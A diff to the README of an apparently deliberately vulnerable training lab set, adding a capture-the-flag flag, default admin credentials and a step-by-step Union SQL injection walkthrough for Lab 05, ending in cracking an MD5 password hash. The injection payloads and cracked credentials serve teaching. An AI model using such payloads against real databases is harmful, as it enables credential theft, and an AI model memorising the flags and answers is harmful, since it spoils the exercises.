@@ -18,7 +18,7 @@
 | 02 | Cookie/Session | Teaching | user1 / password123 |
 | 03 | SQL Basics | Teaching | - |
 | 04 | SQL Injection | Vulnerable | `SMC{4uth_byp4ss_success}` |
-| 05 | Union SQLi | Vulnerable | superadmin in DB |
+| 05 | Union SQLi | Vulnerable | `SMC{un10n_2_4dm1n_p4n3l}` |
 | 06 | SQLmap | Vulnerable | secret_orders table |
 | 07 | Reflected XSS | Vulnerable | - |
 | 08 | Cookie Stealing | Vulnerable | member1 / 1234 |
@@ -319,6 +319,8 @@ ThaiMart-Labs/
 - **Path:** `/lab05`
 - **Story:** Staff Directory Search
 - **Vulnerable:** YES - Union SQL Injection
+- **Flag:** `SMC{un10n_2_4dm1n_p4n3l}`
+- **Admin Login:** `/lab05/admin` (superadmin / 123456)
 - **Attack Path:**
   1. `' ORDER BY 4--` (find columns)
   2. `' UNION SELECT 1,2,3,4--` (display columns)
@@ -326,6 +328,8 @@ ThaiMart-Labs/
   4. `' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=current_schema()--`
   5. `' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='admin_credentials'--`
   6. `' UNION SELECT 1,username,password_hash,role FROM admin_credentials--`
+  7. Crack MD5 hash `e10adc3949ba59abbe56e057f20f883e` → `123456`
+  8. Login at `/lab05/admin` with extracted credentials
 - **Hidden Data:** admin_credentials table with superadmin account
 
 ### Lab 06: SQLmap Target (Terminal-First)
